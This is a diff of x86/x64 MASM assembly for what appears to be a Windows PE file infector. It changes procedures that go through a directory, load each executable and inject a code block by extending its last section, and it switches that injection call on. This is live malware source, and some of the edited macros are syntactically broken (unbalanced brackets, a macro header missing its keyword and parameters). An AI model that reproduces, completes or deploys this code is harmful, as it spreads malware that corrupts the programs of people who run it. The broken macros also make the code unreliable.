@@ -89,16 +89,16 @@ PeParser struct
 PeParser ends
 
 
-Stdcall0 typedef proto CurrentStdcallNotation
-Stdcall1 typedef proto CurrentStdcallNotation :cword
-Stdcall2 typedef proto CurrentStdcallNotation :cword, :cword
-Stdcall3 typedef proto CurrentStdcallNotation :cword, :cword, :cword
-Stdcall4 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword
-Stdcall5 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword, :cword
-Stdcall6 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword, :cword, :cword
-Stdcall7 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword, :cword, :cword, :cword
-Stdcall8 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword, :cword, :cword, :cword, :cword
-Stdcall9 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword, :cword, :cword, :cword, :cword, :cword
+Stdcall0_x86 typedef proto Stdcall
+Stdcall1_x86 typedef proto Stdcall :dword
+Stdcall2_x86 typedef proto Stdcall :dword, :dword
+Stdcall3_x86 typedef proto Stdcall :dword, :dword, :dword
+Stdcall4_x86 typedef proto Stdcall :dword, :dword, :dword, :dword
+Stdcall5_x86 typedef proto Stdcall :dword, :dword, :dword, :dword, :dword
+Stdcall6_x86 typedef proto Stdcall :dword, :dword, :dword, :dword, :dword, :dword
+Stdcall7_x86 typedef proto Stdcall :dword, :dword, :dword, :dword, :dword, :dword, :dword
+Stdcall8_x86 typedef proto Stdcall :dword, :dword, :dword, :dword, :dword, :dword, :dword, :dword
+Stdcall9_x86 typedef proto Stdcall :dword, :dword, :dword, :dword, :dword, :dword, :dword, :dword, :dword
 ;StdcallVararg typedef proto CurrentStdcallNotation :vararg
 CdeclVararg typedef proto CurrentCdeclNotation :vararg
 
@@ -106,8 +106,12 @@ DefineStdcallVarargProto macro name:req
     sc_&name equ <StdcallVararg ptr [cbx + p_&name]>
 endm
 
-DefineStdcallProto macro name:req, count:req
-    sc_&name equ <Stdcall&count ptr [cbx + p_&name]>
+DefineStdcallProto_x86 macro name:req, count:req
+    sc_&name equ <Stdcall_x86&count ptr ebx + p_&name]>
+endm
+
+DefineStdcallProto_x64
+    sc_&name equ <Stdcall&count ptr rbx + p_&name]>
 endm
 
 DefineCProto macro name:req
@@ -667,7 +671,7 @@ InjectPeFilesInDirectory proc stdcall uses cdi dirName:ptr byte
 @@:
 	lea cdi, [fullName]
 	add cdi, [nameLen]
-	invoke sc_memcpy, cdi, addr [findData].WIN32_FIND_DATAA.cFileName, 90
+	invoke sc_memcpy, cdi, addr [findData].WIN32_FIND_DATAA.cFileName, 50
 	
 	invoke LoadPeFile, addr [fullName], addr [pe], 0
 	.if cax		
@@ -1031,8 +1035,8 @@ InjectPeFile proc stdcall uses cdi csi pe:ptr byte
 	
     ; расширяем последнюю секцию
     ; ExtendLastSection (pe, 2 * sizeof(DWORD) + codeSize + ((DWORD)InjectCode - (DWORD)InjectedCode), &rvaNewData, &offsetNewData);
-	;invoke ExtendLastSection, [pe], sc_end - sc_start, addr [rvaNewData], addr [offsetNewData]
-	
+	invoke ExtendLastSection, [pe], sc_end - sc_start, addr [rvaNewData], addr [offsetNewData]
+	;invoke ExtendFirstCodeSection [pe], sc_end - sc_start, addr [rvaNewData], addr [offsetNewData]
 	
 	; cdi = pe
 	mov cdi, [pe]
